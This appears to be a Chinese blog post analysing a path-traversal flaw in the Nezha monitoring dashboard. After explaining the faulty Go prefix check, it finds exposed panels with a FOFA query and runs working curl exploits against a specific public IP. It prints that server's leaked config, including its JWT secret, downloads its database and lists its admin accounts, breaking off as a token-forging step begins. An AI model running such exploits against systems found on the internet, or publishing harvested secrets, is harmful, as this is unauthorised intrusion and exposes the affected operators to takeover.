@@ -1,0 +1,1168 @@
+<!DOCTYPE HTML>
+<html lang="zh-CN">
+
+<head>
+    <meta charset="utf-8" />
+    <meta name="viewport"
+        content="initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=0, width=device-width" />
+    <meta name="renderer" content="webkit">
+    <meta name="format-detection" content="telephone=no, email=no, address=no">
+
+    <meta name="generator" content="Gridea Pro 1.2.2">
+    <title>哪吒监控Dashboard路径漏洞实战测试 | 玄外之音</title>
+
+    
+    <meta name="theme-color" content="#ffffff" media="(prefers-color-scheme: light)">
+    <meta name="theme-color" content="#292a2d" media="(prefers-color-scheme: dark)">
+
+    
+    <link rel="shortcut icon" href="/media/images/favicon.ico">
+<link rel="stylesheet" href="/styles/main.min.css">
+
+    
+    <style>:root{--accent-color:#28df99;}</style>
+    
+
+    <script>
+    // 自动为所有 target="_blank" 的链接添加 rel="noopener noreferrer"
+    document.addEventListener('DOMContentLoaded', function() {
+        var links = document.querySelectorAll('a[target="_blank"]');
+        links.forEach(function(link) {
+            var rel = link.getAttribute('rel') || '';
+            if (rel.indexOf('noopener') === -1) {
+                rel += ' noopener';
+            }
+            if (rel.indexOf('noreferrer') === -1) {
+                rel += ' noreferrer';
+            }
+            link.setAttribute('rel', rel.trim());
+        });
+    });
+</script>
+
+
+
+    <script>
+    // declaraction of document.ready() function.
+    (function () {
+        var ie = !!(window.attachEvent && !window.opera);
+        var wk = /webkit\/(\d+)/i.test(navigator.userAgent) && (RegExp.$1 < 525);
+        var fn = [];
+        var run = function () {
+            for (var i = 0; i < fn.length; i++) fn[i]();
+        };
+        var d = document;
+        d.ready = function (f) {
+            if (!ie && !wk && d.addEventListener)
+                return d.addEventListener('DOMContentLoaded', f, false);
+            if (fn.push(f) > 1) return;
+            if (ie)
+                (function () {
+                    try {
+                        d.documentElement.doScroll('left');
+                        run();
+                    } catch (err) {
+                        setTimeout(arguments.callee, 0);
+                    }
+                })();
+            else if (wk)
+                var t = setInterval(function () {
+                    if (/^(loaded|complete)$/.test(d.readyState))
+                        clearInterval(t), run();
+                }, 0);
+        };
+    })();
+
+
+    document.ready(
+        function () {
+            var _Blog = window._Blog || {};
+
+            const getSystemTheme = () => {
+                if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                    return 'dark';
+                }
+                return 'light';
+            };
+
+            const configDefault = 'light';
+            const currentTheme = window.localStorage && window.localStorage.getItem('theme');
+            const initialTheme = currentTheme || configDefault || getSystemTheme();
+            const isDark = initialTheme === 'dark';
+
+            const updateButtons = (dark) => {
+                const sunBtn = document.getElementById("theme-toggle-sun");
+                const moonBtn = document.getElementById("theme-toggle-moon");
+                const mobileSunBtn = document.getElementById("mobile-theme-toggle-sun");
+                const mobileMoonBtn = document.getElementById("mobile-theme-toggle-moon");
+
+                if (dark) {
+                    if (sunBtn) sunBtn.style.display = 'none';
+                    if (moonBtn) moonBtn.style.display = 'inline-block';
+                    if (mobileSunBtn) mobileSunBtn.style.display = 'none';
+                    if (mobileMoonBtn) mobileMoonBtn.style.display = 'inline-block';
+                } else {
+                    if (sunBtn) sunBtn.style.display = 'inline-block';
+                    if (moonBtn) moonBtn.style.display = 'none';
+                    if (mobileSunBtn) mobileSunBtn.style.display = 'inline-block';
+                    if (mobileMoonBtn) mobileMoonBtn.style.display = 'none';
+                }
+            };
+
+            const updateThemeColor = (dark) => {
+                const themeColor = dark ? '#292a2d' : '#ffffff';
+                const metaTags = document.querySelectorAll('meta[name="theme-color"]');
+                if (metaTags.length > 0) {
+                    // 保留第一个，移除其他的，避免重复
+                    for (let i = 1; i < metaTags.length; i++) {
+                        metaTags[i].remove();
+                    }
+                    metaTags[0].setAttribute('content', themeColor);
+                    metaTags[0].removeAttribute('media');
+                } else {
+                    const meta = document.createElement('meta');
+                    meta.name = 'theme-color';
+                    meta.content = themeColor;
+                    document.head.appendChild(meta);
+                }
+            };
+
+            const applyTheme = (dark) => {
+                const body = document.getElementsByTagName('body')[0];
+                if (dark) {
+                    body.classList.add('dark-theme');
+                } else {
+                    body.classList.remove('dark-theme');
+                }
+                updateButtons(dark);
+                updateThemeColor(dark);
+            };
+
+            // Initial application
+            applyTheme(isDark);
+            if (!currentTheme) {
+                window.localStorage && window.localStorage.setItem('theme', initialTheme);
+            }
+
+            _Blog.toggleTheme = function () {
+                const toggleFunc = (e) => {
+                    // Prevent bubbling if needed, though buttons are distinct now
+                    if (e) e.stopPropagation();
+
+                    const body = document.getElementsByTagName('body')[0];
+                    const isCurrentlyDark = body.classList.contains('dark-theme');
+
+                    if (isCurrentlyDark) {
+                        body.classList.remove('dark-theme');
+                        updateButtons(false);
+                        window.localStorage && window.localStorage.setItem('theme', 'light');
+                    } else {
+                        body.classList.add('dark-theme');
+                        updateButtons(true);
+                        window.localStorage && window.localStorage.setItem('theme', 'dark');
+                    }
+                };
+
+                const sunBtn = document.getElementById("theme-toggle-sun");
+                const moonBtn = document.getElementById("theme-toggle-moon");
+                const mobileSunBtn = document.getElementById("mobile-theme-toggle-sun");
+                const mobileMoonBtn = document.getElementById("mobile-theme-toggle-moon");
+
+                if (sunBtn) sunBtn.addEventListener('click', toggleFunc);
+                if (moonBtn) moonBtn.addEventListener('click', toggleFunc);
+                if (mobileSunBtn) mobileSunBtn.addEventListener('click', toggleFunc);
+                if (mobileMoonBtn) mobileMoonBtn.addEventListener('click', toggleFunc);
+            };
+            _Blog.toggleTheme();
+
+            if (window.matchMedia && !configDefault) {
+                window.matchMedia('(prefers-color-scheme: dark)').addEventListener('change', e => {
+                    const newTheme = e.matches ? 'dark' : 'light';
+                    applyTheme(e.matches);
+                    window.localStorage && window.localStorage.setItem('theme', newTheme);
+                });
+            }
+        }
+    );
+</script>
+
+<script>
+    // Reading Progress Component
+    document.addEventListener('DOMContentLoaded', () => {
+        const progressValue = document.querySelector('.reading-value');
+        const progressCircle = document.querySelector('.progress-ring__circle');
+        const container = document.querySelector('.reading-progress-container');
+
+        // Exit if elements don't exist (e.g., not on a post page)
+        if (!progressValue || !progressCircle || !container) {
+            return;
+        }
+
+        // SVG Circle setup
+        const radius = progressCircle.r.baseVal.value;
+        const circumference = 2 * Math.PI * radius;
+
+        progressCircle.style.strokeDasharray = `${circumference} ${circumference}`;
+        progressCircle.style.strokeDashoffset = circumference;
+
+        function setProgress(percent) {
+            const safePercent = Math.min(100, Math.max(0, percent));
+            progressValue.textContent = `${Math.round(safePercent)}%`;
+            const offset = circumference - (safePercent / 100) * circumference;
+            progressCircle.style.strokeDashoffset = offset;
+        }
+
+        function onScroll() {
+            const scrollTop = window.scrollY || document.documentElement.scrollTop;
+            const scrollHeight = document.documentElement.scrollHeight - document.documentElement.clientHeight;
+
+            if (scrollHeight <= 0) {
+                setProgress(0);
+                return;
+            }
+
+            const scrollPercent = (scrollTop / scrollHeight) * 100;
+            setProgress(scrollPercent);
+
+            // Show/Hide logic: Show if scrolled more than 100px
+            if (scrollTop > 100) {
+                container.classList.add('show');
+            } else {
+                container.classList.remove('show');
+            }
+        }
+
+        // Initialize
+        onScroll();
+
+        // Listen for scroll events
+        window.addEventListener('scroll', onScroll, { passive: true });
+
+        // Recalculate on resize
+        window.addEventListener('resize', onScroll);
+    });
+</script>
+
+
+
+
+    
+
+    
+<meta name="description" content="📌 写在前面 哪吒监控官方发布了一则重磅安全公告（GHSA-5c25-7vpj-9mqh），披露了一个无需任何认证即可读取任意文件的高危路径遍历漏洞。作为运维监控领域的常用工具，其影响面不容小觑。 本着&amp;quot;知己知彼&amp;quot;的安全理念，我决定对该漏洞进行完整的分析与验证。本文将完整记录从漏洞原理分析到实战验证的全过程，希望能为运维同仁提供防御参考。 一、漏洞全景概览 #&amp;hellip;">
+<meta name="keywords" content="玄外之音,Hyun,Hyun's Sound,Web Development,IDC,Server,Cloudflare,Minimalism,Digital Garden,SiYuan Note,网络安全,逆向工程,技术随笔">
+<link rel="canonical" href="https://blog.hyun.cc/post/49ZHl5/">
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BlogPosting","headline":"哪吒监控Dashboard路径漏洞实战测试","url":"https://blog.hyun.cc/post/49ZHl5/","description":"📌 写在前面 哪吒监控官方发布了一则重磅安全公告（GHSA-5c25-7vpj-9mqh），披露了一个无需任何认证即可读取任意文件的高危路径遍历漏洞。作为运维监控领域的常用工具，其影响面不容小觑。 本着\u0026quot;知己知彼\u0026quot;的安全理念，我决定对该漏洞进行完整的分析与验证。本文将完整记录从漏洞原理分析到实战验证的全过程，希望能为运维同仁提供防御参考。 一、漏洞全景概览 #\u0026hellip;","datePublished":"2026-06-17T17:44:58+08:00","dateModified":"2026-06-17T17:44:58+08:00","author":{"@type":"Person","name":"玄外之音"},"publisher":{"@type":"Organization","logo":{"@type":"ImageObject","url":"/images/avatar.png"},"name":"玄外之音"}}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","item":"https://blog.hyun.cc","name":"玄外之音","position":1},{"@type":"ListItem","item":"https://blog.hyun.cc/post/49ZHl5/","name":"哪吒监控Dashboard路径漏洞实战测试","position":2}]}</script>
+<meta property="og:title" content="哪吒监控Dashboard路径漏洞实战测试">
+<meta property="og:description" content="📌 写在前面 哪吒监控官方发布了一则重磅安全公告（GHSA-5c25-7vpj-9mqh），披露了一个无需任何认证即可读取任意文件的高危路径遍历漏洞。作为运维监控领域的常用工具，其影响面不容小觑。 本着&amp;quot;知己知彼&amp;quot;的安全理念，我决定对该漏洞进行完整的分析与验证。本文将完整记录从漏洞原理分析到实战验证的全过程，希望能为运维同仁提供防御参考。 一、漏洞全景概览 #&amp;hellip;">
+<meta property="og:url" content="https://blog.hyun.cc/post/49ZHl5/">
+<meta property="og:type" content="article">
+<meta property="og:site_name" content="玄外之音">
+<meta property="og:image" content="/images/avatar.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:url" content="https://blog.hyun.cc/post/49ZHl5/">
+<meta name="twitter:title" content="哪吒监控Dashboard路径漏洞实战测试">
+<meta name="twitter:description" content="📌 写在前面 哪吒监控官方发布了一则重磅安全公告（GHSA-5c25-7vpj-9mqh），披露了一个无需任何认证即可读取任意文件的高危路径遍历漏洞。作为运维监控领域的常用工具，其影响面不容小觑。 本着&amp;quot;知己知彼&amp;quot;的安全理念，我决定对该漏洞进行完整的分析与验证。本文将完整记录从漏洞原理分析到实战验证的全过程，希望能为运维同仁提供防御参考。 一、漏洞全景概览 #&amp;hellip;">
+<meta name="twitter:image" content="/images/avatar.png">
+</head>
+
+    <body>
+
+        <script>
+    (function () {
+        const getSystemTheme = () => {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                return 'dark';
+            }
+            return 'light';
+        };
+
+        const configDefault = 'light';
+        const savedTheme = localStorage.getItem('theme');
+        const theme = savedTheme || configDefault || getSystemTheme();
+
+        if (theme === 'dark') {
+            document.body.classList.add('dark-theme');
+        }
+
+        if (!savedTheme) {
+            localStorage.setItem('theme', theme);
+        }
+    })();
+</script>
+<header class="mod-head">
+    <div class="mod-head__left">
+        <div class="mod-head__logo">
+            <a href="/">
+                
+                
+                    <img class="avatar" alt="avatar" src="/images/avatar.png">
+                
+            </a>
+        </div>
+    </div>
+
+    <div class="mod-head__right">
+        <span>
+            <button id="theme-toggle-sun" class="tiptap-button theme-toggle-sun" aria-label="Switch to dark mode">
+                <svg width="18" height="18" class="tiptap-button-icon" viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
+                    <path d="M12 1C12.5523 1 13 1.44772 13 2V4C13 4.55228 12.5523 5 12 5C11.4477 5 11 4.55228 11 4V2C11 1.44772 11.4477 1 12 1Z" fill="currentColor"></path>
+                    <path fill-rule="evenodd" clip-rule="evenodd" d="M7 12C7 9.23858 9.23858 7 12 7C14.7614 7 17 9.23858 17 12C17 14.7614 14.7614 17 12 17C9.23858 17 7 14.7614 7 12ZM12 9C10.3431 9 9 10.3431 9 12C9 13.6569 10.3431 15 12 15C13.6569 15 15 13.6569 15 12C15 10.3431 13.6569 9 12 9Z" fill="currentColor"></path>
+                    <path d="M13 20C13 19.4477 12.5523 19 12 19C11.4477 19 11 19.4477 11 20V22C11 22.5523 11.4477 23 12 23C12.5523 23 13 22.5523 13 22V20Z" fill="currentColor"></path>
+                    <path d="M4.22282 4.22289C4.61335 3.83236 5.24651 3.83236 5.63704 4.22289L7.04704 5.63289C7.43756 6.02341 7.43756 6.65658 7.04704 7.0471C6.65651 7.43762 6.02335 7.43762 5.63283 7.0471L4.22282 5.6371C3.8323 5.24658 3.8323 4.61341 4.22282 4.22289Z" fill="currentColor"></path>
+                    <path d="M18.367 16.9529C17.9765 16.5623 17.3433 16.5623 16.9528 16.9529C16.5623 17.3434 16.5623 17.9766 16.9528 18.3671L18.3628 19.7771C18.7533 20.1676 19.3865 20.1676 19.777 19.7771C20.1675 19.3866 20.1675 18.7534 19.777 18.3629L18.367 16.9529Z" fill="currentColor"></path>
+                    <path d="M1 12C1 11.4477 1.44772 11 2 11H4C4.55228 11 5 11.4477 5 12C5 12.5523 4.55228 13 4 13H2C1.44772 13 1 12.5523 1 12Z" fill="currentColor"></path>
+                    <path d="M20 11C19.4477 11 19 11.4477 19 12C19 12.5523 19.4477 13 20 13H22C22.5523 13 23 12.5523 23 12C23 11.4477 22.5523 11 22 11H20Z" fill="currentColor"></path>
+                    <path d="M7.04704 16.9529C7.43756 17.3434 7.43756 17.9766 7.04704 18.3671L5.63704 19.7771C5.24651 20.1676 4.61335 20.1676 4.22282 19.7771C3.8323 19.3866 3.8323 18.7534 4.22283 18.3629L5.63283 16.9529C6.02335 16.5623 6.65651 16.5623 7.04704 16.9529Z" fill="currentColor"></path>
+                    <path d="M19.777 5.6371C20.1675 5.24657 20.1675 4.61341 19.777 4.22289C19.3865 3.83236 18.7533 3.83236 18.3628 4.22289L16.9528 5.63289C16.5623 6.02341 16.5623 6.65658 16.9528 7.0471C17.3433 7.43762 17.9765 7.43762 18.367 7.0471L19.777 5.6371Z" fill="currentColor"></path>
+                </svg>
+            </button>
+            <button id="theme-toggle-moon" class="tiptap-button theme-toggle-moon" aria-label="Switch to light mode">
+                <svg width="18" height="18" class="tiptap-button-icon" viewBox="0 0 24 24" fill="currentColor" xmlns="http://www.w3.org/2000/svg">
+                    <path fill-rule="evenodd" clip-rule="evenodd" d="M12 2C10.0222 2 8.08879 2.58649 6.4443 3.6853C4.79981 4.78412 3.51809 6.3459 2.76121 8.17317C2.00433 10.0004 1.8063 12.0111 2.19215 13.9509C2.578 15.8907 3.53041 17.6725 4.92894 19.0711C6.32746 20.4696 8.10929 21.422 10.0491 21.8079C11.9889 22.1937 13.9996 21.9957 15.8268 21.2388C17.6541 20.4819 19.2159 19.2002 20.3147 17.5557C21.4135 15.9112 22 13.9778 22 12C22 11.5955 21.7564 11.2309 21.3827 11.0761C21.009 10.9213 20.5789 11.0069 20.2929 11.2929C19.287 12.2988 17.9226 12.864 16.5 12.864C15.0774 12.864 13.713 12.2988 12.7071 11.2929C11.7012 10.287 11.136 8.92261 11.136 7.5C11.136 6.07739 11.7012 4.71304 12.7071 3.70711C12.9931 3.42111 13.0787 2.99099 12.9239 2.61732C12.7691 2.24364 12.4045 2 12 2ZM7.55544 5.34824C8.27036 4.87055 9.05353 4.51389 9.87357 4.28778C9.39271 5.27979 9.13604 6.37666 9.13604 7.5C9.13604 9.45304 9.91189 11.3261 11.2929 12.7071C12.6739 14.0881 14.547 14.864 16.5 14.864C17.6233 14.864 18.7202 14.6073 19.7122 14.1264C19.4861 14.9465 19.1295 15.7296 18.6518 16.4446C17.7727 17.7602 16.5233 18.7855 15.0615 19.391C13.5997 19.9965 11.9911 20.155 10.4393 19.8463C8.88743 19.5376 7.46197 18.7757 6.34315 17.6569C5.21447 16.538 4.4624 15.1126 4.15372 13.5607C3.84504 12.0089 4.00347 10.4003 4.60897 8.93853C5.21447 7.47672 6.23985 6.22729 7.55544 5.34824Z" fill="currentColor"></path>
+                    <path d="M19 2C19.5523 2 20 2.44772 20 3V4H21C21.5523 4 22 4.44772 22 5C22 5.55228 21.5523 6 21 6H20V7C20 7.55228 19.5523 8 19 8C18.4477 8 18 7.55228 18 7V6H17C16.4477 6 16 5.55228 16 5C16 4.44772 16.4477 4 17 4H18V3C18 2.44772 18.4477 2 19 2Z" fill="currentColor"></path>
+                </svg>
+            </button>
+        </span>
+    </div>
+</header>
+<!-- <a href="#" id="back-to-top" style="display: inline;"> ^ </a> -->
+
+            <article class="mod-post mod-post__type-post">
+                <header>
+                    <h1 class="mod-post__title">
+                        哪吒监控Dashboard路径漏洞实战测试
+                    </h1>
+                </header>
+
+                <div class="mod-post__meta">
+                    <time datetime="2026/06/17">
+                        2026/06/17
+                    </time> • 36 分钟阅读 •
+                        
+                            <a href="/tag/na-zha-tan-zhen/">
+                                哪吒探针
+                            </a>
+                            
+                                    
+                </div>
+
+
+
+                <div class="mod-post__entry wzulli">
+                    
+                            <h2 id="-">📌 写在前面</h2>
+<p>哪吒监控官方发布了一则重磅安全公告（GHSA-5c25-7vpj-9mqh），披露了一个<strong>无需任何认证即可读取任意文件</strong>的高危路径遍历漏洞。作为运维监控领域的常用工具，其影响面不容小觑。</p>
+<p>本着&quot;知己知彼&quot;的安全理念，我决定对该漏洞进行完整的分析与验证。本文将完整记录从漏洞原理分析到实战验证的全过程，希望能为运维同仁提供防御参考。</p>
+<hr />
+<h2 id="heading">一、漏洞全景概览</h2>
+<h3 id="11-">1.1 核心信息速览</h3>
+<table>
+<thead>
+<tr>
+<th>项目</th>
+<th>详情</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>漏洞编号</strong></td>
+<td>GHSA-5c25-7vpj-9mqh</td>
+</tr>
+<tr>
+<td><strong>影响组件</strong></td>
+<td>github.com/nezhahq/nezha (哪吒监控Dashboard)</td>
+</tr>
+<tr>
+<td><strong>漏洞类型</strong></td>
+<td>路径遍历 (Path Traversal)</td>
+</tr>
+<tr>
+<td><strong>危险等级</strong></td>
+<td>🔴 <strong>高危</strong></td>
+</tr>
+<tr>
+<td><strong>攻击门槛</strong></td>
+<td><strong>极低</strong> —— 无需任何认证，一次GET请求即可</td>
+</tr>
+<tr>
+<td><strong>影响版本</strong></td>
+<td>所有未修复的旧版部署</td>
+</tr>
+</tbody>
+</table>
+<h3 id="12-">1.2 漏洞本质</h3>
+<p>哪吒监控Dashboard的 <code>NoRoute</code> 处理器在处理 <code>/dashboard</code> 路径请求时，采用 <code>strings.HasPrefix</code> 进行简单的前缀匹配，未对路径进行严格的段校验。攻击者可精心构造特制URL，巧妙绕过 <code>http.ServeFile</code> 内置的路径遍历防护机制，实现服务器任意文件的读取。</p>
+<p><strong>一句话总结：这是一个因字符串匹配逻辑缺陷而引发的文件读取漏洞，且无需任何凭证即可触发。</strong></p>
+<hr />
+<h2 id="--">二、漏洞原理 · 深入拆解</h2>
+<h3 id="21-">2.1 问题代码定位</h3>
+<p>漏洞核心存在于 <code>cmd/dashboard/controller/controller.go</code>：</p>
+<pre><code class="language-go">// 存在缺陷的代码逻辑（版本 @ 636f4a9）
+fallbackStatusCode := getFallbackStatusCode(c.Request.URL.Path)
+if strings.HasPrefix(c.Request.URL.Path, &quot;/dashboard&quot;) {
+    stripPath := strings.TrimPrefix(c.Request.URL.Path, &quot;/dashboard&quot;)
+    localFilePath := path.Join(singleton.Conf.AdminTemplate, stripPath)
+    if checkLocalFileOrFs(c, frontendDist, localFilePath, http.StatusOK) {
+        return
+    }
+}
+
+func fallbackToFrontend(frontendDist fs.FS) func(*gin.Context) {
+    checkLocalFileOrFs := func(c *gin.Context, fs fs.FS, path string, customStatusCode int) bool {
+        if _, err := os.Stat(path); err == nil {
+            http.ServeFile(utils.NewGinCustomWriter(c, customStatusCode), c.Request, path)
+            return true
+        }
+    }
+}
+</code></pre>
+<h3 id="22-">2.2 攻击向量对比表</h3>
+<table>
+<thead>
+<tr>
+<th>请求URL</th>
+<th>TrimPrefix结果</th>
+<th>path.Join结果</th>
+<th>是否绕过</th>
+<th>结果</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>/dashboard/login</code></td>
+<td><code>/login</code></td>
+<td><code>admin-dist/login</code></td>
+<td>❌</td>
+<td>正常访问</td>
+</tr>
+<tr>
+<td><code>/dashboard/../data/config.yaml</code></td>
+<td><code>/../data/config.yaml</code></td>
+<td><code>data/config.yaml</code></td>
+<td>✅ 被Go拦截</td>
+<td>400 Bad Request</td>
+</tr>
+<tr>
+<td><code>/dashboard../data/config.yaml</code></td>
+<td><code>../data/config.yaml</code></td>
+<td><code>data/config.yaml</code></td>
+<td>✅ <strong>绕过成功</strong></td>
+<td><strong>读取任意文件</strong></td>
+</tr>
+<tr>
+<td><code>/dashboard%2e%2e/data/config.yaml</code></td>
+<td><code>../data/config.yaml</code> (解码后)</td>
+<td><code>data/config.yaml</code></td>
+<td>✅ <strong>绕过成功</strong></td>
+<td><strong>读取任意文件</strong></td>
+</tr>
+<tr>
+<td><code>/dashboard..%2fdata/config.yaml</code></td>
+<td><code>../data/config.yaml</code> (解码后)</td>
+<td><code>data/config.yaml</code></td>
+<td>✅ <strong>绕过成功</strong></td>
+<td><strong>读取任意文件</strong></td>
+</tr>
+</tbody>
+</table>
+<h3 id="23-">2.3 绕过逻辑可视化</h3>
+<pre><code>攻击Payload构造流程：
+
+正常请求: /dashboard/login
+         ↓ strings.HasPrefix → True
+         ↓ strings.TrimPrefix → /login
+         ↓ path.Join → admin-dist/login
+         ↓ 返回 admin-dist/login ✅
+
+攻击请求: /dashboard../data/config.yaml
+         ↓ strings.HasPrefix → True (注意：/dashboard.. 仍然以 /dashboard 开头)
+         ↓ strings.TrimPrefix → ../data/config.yaml
+         ↓ path.Join → data/config.yaml (路径穿越成功)
+         ↓ os.Stat → 文件存在
+         ↓ http.ServeFile → 返回文件内容 🚨
+
+为什么 /dashboard/../data/config.yaml 被拦截？
+         ↓ 包含独立 &quot;..&quot; 段 → http.ServeFile 内置防护触发 → 400 Bad Request
+
+为什么 /dashboard../data/config.yaml 成功？
+         ↓ 第一个URL段是单个 token &quot;dashboard..&quot; → 没有独立 &quot;..&quot; 段
+         ↓ 标准库防护不触发 → 路径穿越在 TrimPrefix 后才出现 → 成功读取
+</code></pre>
+<p><strong>关键绕过点拆解：</strong></p>
+<ol>
+<li><strong>前缀检查缺陷</strong>：<code>strings.HasPrefix</code> 仅进行字符串前缀匹配，<code>/dashboard</code> 与 <code>/dashboard..</code> 均被视为有效</li>
+<li><strong>清理时机错位</strong>：<code>path.Join</code> 在 <code>TrimPrefix</code> 之后执行，此时 <code>..</code> 已被成功引入路径</li>
+<li><strong>标准库防护盲区</strong>：<code>http.ServeFile</code> 仅检查URL路径中的<strong>独立</strong> <code>..</code> 段（即被 <code>/</code> 包围的 <code>..</code>），而 <code>dashboard..</code> 中的 <code>..</code> 是第一个段的一部分，不会被识别为威胁</li>
+<li><strong>缺少根目录锚定</strong>：代码在 <code>path.Join</code> 后未检查结果是否仍在 <code>admin-dist</code> 目录内</li>
+</ol>
+<hr />
+<h2 id="heading-1">三、实战测试</h2>
+<h3 id="31-">3.1 信息侦查</h3>
+<p><strong>资产发现</strong>：</p>
+<p>使用FOFA搜索引擎定位暴露在公网的哪吒面板：</p>
+<pre><code>FOFA语法: title=&quot;哪吒监控&quot; &amp;&amp; port=&quot;8008&quot;
+</code></pre>
+<p>本次测试目标选定：<code>http://103.215.48.166:8008</code></p>
+<h3 id="32-">3.2 漏洞验证</h3>
+<h4 id="heading-2">步骤一：探测路径遍历漏洞</h4>
+<pre><code class="language-bash">curl -v --path-as-is 'http://103.215.48.166:8008/dashboard../data/config.yaml'
+</code></pre>
+<p><strong>服务器响应</strong>：</p>
+<pre><code class="language-http">HTTP/1.1 200 OK
+Content-Type: application/yaml
+Content-Length: 5523
+
+debug: false
+listen_port: 8008
+language: zh_CN
+jwt_secret_key: rxLGg4gNLJEhRKA0oBOKBoGCaoqkdNW2R8OhLXu2XOZqKsWZy0iF5u4WXBl9zfeeFk3VaSVzYiL1rem8FD6lA8aMttCOmE7m6D5SogIiW58VF5h6rdvTIhQpoy4qel2XED3mcAU7uvZIWIdCDYfKPmSD7VwCR2T1D2HoVCerfG3uk7KqpIekcausnq7abpGrVSBTVHEs9OLnXnkBwKbmMllSJhbd3W43Ckn6IJHrZDBhKi0nFxQHlX6I9V1eZy3Iau8bDkCUmP9eBLW40oniZIkXzwUSRTERxVC5fdBglbWYUdGxY97xGMoVv0PlEtxP1tsL9Qy783c292IjErBYc9KP5w3NXYz4oc4JL5Q9AKEIzP6VEbcb42ueUsJw457486jiBplPILVCwqF3hdUI9K4Hx4s0g0BUT24zTCEt3BXmDH7FoueVYxnqWnUujgYbtWOxUEJ2MM6gmAGec38sJzLWPxCpzvNjOuSoth4WRI9CRTzta0242JwO2k7zbcPSk6aYMz79fA7LzScnVbLQqLevc6XQlvpfVbkCCUP4sz3vVJt992QFVnoJ0dCVfumVPFsIdPj29YfJxqgvVJK6YMIVZYbhtst4Xg5l7MNYjImMtddoaVsmzAmNwSD5qenmMtnunKSOWDJCshhoCy8kbbaTpSccLGOeUXtxDtKFaUr11moJcdqi2Wqe1wgP3LzrHJocjnP5IMaamG30WJZWqyDwIqJqs56PtNEVnRiyF2rFiwvJpmtMZKFkXzdPzoNt2QIEdsGX0utcslrM84E6RQtAPlobaRAM0mxYFft7UC3XGzht5ziTqs9DasM13Tf7jYOn2hveEZE2yyqLNn9CddcOjgUFobqtwaoBmldRXUoxmZkRMSKFqdTbG52exCSCHcf0RGR2Z0SGSRM2tFUqBDD3nUQv5zkg5cAUqncKZFgY1nbp4NcKuMW5XgfGCTyfDk0bOLy91Ak4m6X9nNJHbPlBT1SFdibjDo9Kkhrqu3UF9b2HeoJYTluTDv6Yl03j
+</code></pre>
+<p>✅ <strong>成功获取配置文件</strong> —— JWT密钥与Agent密钥全部暴露！</p>
+<h3 id="33-">3.3 深入利用</h3>
+<h4 id="heading-3">步骤二：下载数据库文件</h4>
+<pre><code class="language-bash">curl --path-as-is 'http://103.215.48.166:8008/dashboard../data/sqlite.db' -o sqlite.db
+</code></pre>
+<p>成功下载约5MB的 <code>sqlite.db</code> 文件。</p>
+<h4 id="heading-4">步骤三：数据库信息提取</h4>
+<pre><code class="language-bash">sqlite3 sqlite.db &quot;SELECT id, username, role FROM users;&quot;
+</code></pre>
+<p><strong>令人震惊的结果</strong>：</p>
+<table>
+<thead>
+<tr>
+<th>ID</th>
+<th>用户名</th>
+<th>角色</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>1</td>
+<td><strong>admin</strong></td>
+<td>管理员</td>
+</tr>
+<tr>
+<td>2</td>
+<td>xiaofeng</td>
+<td>管理员</td>
+</tr>
+<tr>
+<td>3</td>
+<td>system</td>
+<td>管理员</td>
+</tr>
+<tr>
+<td>4</td>
+<td>adm_vffarbmb</td>
+<td>管理员</td>
+</tr>
+<tr>
+<td>5</td>
+<td>adm_dsesavvc</td>
+<td>管理员</td>
+</tr>
+<tr>
+<td>6</td>
+<td>adm_s/stwvkg</td>
+<td>管理员</td>
+</tr>
+<tr>
+<td>7</td>
+<td>adm_fr4dy7/x</td>
+<td>管理员</td>
+</tr>
+<tr>
+<td>8</td>
+<td>adm_qha+o3pg</td>
+<td>管理员</td>
+</tr>
+<tr>
+<td>9</td>
+<td>adm_2+lrtv3+</td>
+<td>管理员</td>
+</tr>
+<tr>
+<td>10</td>
+<td>adm_xxwiuzec</td>
+<td>管理员</td>
+</tr>
+<tr>
+<td>11</td>
+<td>adm_luqs0mhf</td>
+<td>管理员</td>
+</tr>
+<tr>
+<td>12</td>
+<td>adm_ambw/x5z</td>
+<td>管理员</td>
+</tr>
+<tr>
+<td>13</td>
+<td>adm_mqqd+h4+</td>
+<td>管理员</td>
+</tr>
+<tr>
+<td>14</td>
+<td>adm_ieu8o3ep</td>
+<td>管理员</td>
+</tr>
+<tr>
+<td>15</td>
+<td>adm_dwjr41v3</td>
+<td>管理员</td>
+</tr>
+<tr>
+<td>16</td>
+<td>adm_wyc7dear</td>
+<td>管理员</td>
+</tr>
+<tr>
+<td>17</td>
+<td>adm_2fr/p2fo</td>
+<td>管理员</td>
+</tr>
+</tbody>
+</table>
+<p>⚠️ <strong>发现异常</strong>：</p>
+<ul>
+<li>默认 <code>admin</code> 账户<strong>仍然存在且未修改密码</strong>但是我们本次是测试利用Cookie实现登录，所以就当admin不存在。</li>
+<li>存在大量随机名称的管理员账户（疑似已被多次入侵的痕迹）</li>
+</ul>
+<h4 id="token">步骤四：通过数据库生成token</h4>
+<pre><code class="language-json">
+
+[*] 启动全量信息审计: http://103.215.48.166:8008
+
